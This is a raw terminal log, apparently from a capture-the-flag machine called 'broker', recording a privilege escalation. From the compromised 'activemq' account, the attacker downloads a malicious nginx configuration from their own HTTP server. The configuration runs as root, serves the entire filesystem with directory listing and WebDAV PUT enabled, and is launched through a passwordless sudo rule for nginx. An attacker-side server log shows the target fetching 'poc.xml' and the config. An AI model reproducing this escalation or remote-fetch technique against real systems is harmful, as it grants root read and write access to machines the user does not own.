```
activemq@broker:~$ curl http://10.10.16.4:8000/../nginx_server_exploit.conf
curl http://10.10.16.4:8000/../nginx_server_exploit.conf
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
activemq@broker:~$ ls
ls
user.txt
activemq@broker:~$ curl http://10.10.16.4:8000/nginx_server_exploit.conf
curl http://10.10.16.4:8000/nginx_server_exploit.conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
activemq@broker:~$ ls
ls
user.txt
activemq@broker:~$ curl http://10.10.16.4:8000/nginx_server_exploit.conf > server.conf
curl http://10.10.16.4:8000/nginx_server_exploit.conf > server.conf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   163  100   163    0     0    319      0 --:--:-- --:--:-- --:--:--   320
activemq@broker:~$ md5sum server.conf
md5sum server.conf
dd9319ac1cc887b41bb12b52f696a347  server.conf
activemq@broker:~$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
activemq@broker:~$ sudo /usr/sbin/nginx -c server.conf
sudo /usr/sbin/nginx -c server.conf
nginx: [emerg] open() "/usr/share/nginx/server.conf" failed (2: No such file or directory)
activemq@broker:~$ ls
ls
server.conf  user.txt
activemq@broker:~$ chmod °x server.conf
chmod °x server.conf
chmod: invalid mode: ‘°x’
Try 'chmod --help' for more information.
activemq@broker:~$ chmod +x server.conf
chmod +x server.conf
activemq@broker:~$ sudo /usr/sbin/nginx -c server.conf
sudo /usr/sbin/nginx -c server.conf
nginx: [emerg] open() "/usr/share/nginx/server.conf" failed (2: No such file or directory)
activemq@broker:~$ pwd
pwd
/home/activemq
activemq@broker:~$ sudo /usr/sbin/nginx -c /home/activemq/server.conf
sudo /usr/sbin/nginx -c /home/activemq/server.conf
nginx: [emerg] open() "/home/activemq/server.conf" failed (2: No such file or directory)
activemq@broker:~$ ls
ls
user.txt
activemq@broker:~$ curl http://10.10.16.4:8000/nginx_server_exploit.conf > server.conf
curl http://10.10.16.4:8000/nginx_server_exploit.conf > server.conf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   163  100   163    0     0    323      0 --:--:-- --:--:-- --:--:--   323
activemq@broker:~$ sudo /usr/sbin/nginx -c /home/activemq/server.conf
sudo /usr/sbin/nginx -c /home/activemq/server.conf
activemq@broker:~$
```


```
sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.243 - - [04/Feb/2024 06:06:06] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [04/Feb/2024 06:06:07] "GET /poc.xml HTTP/1.1" 200 -
10.10.11.243 - - [04/Feb/2024 06:16:29] code 404, message File not found
10.10.11.243 - - [04/Feb/2024 06:16:29] "GET /nginx_server_exploit.conf HTTP/1.1" 404 -
10.10.11.243 - - [04/Feb/2024 06:17:12] "GET /nginx_server_exploit.conf HTTP/1.1" 200 -
10.10.11.243 - - [04/Feb/2024 06:17:30] "GET /nginx_server_exploit.conf HTTP/1.1" 200 -
10.10.11.243 - - [04/Feb/2024 06:20:47] "GET /nginx_server_exploit.conf HTTP/1.1" 200 -
```


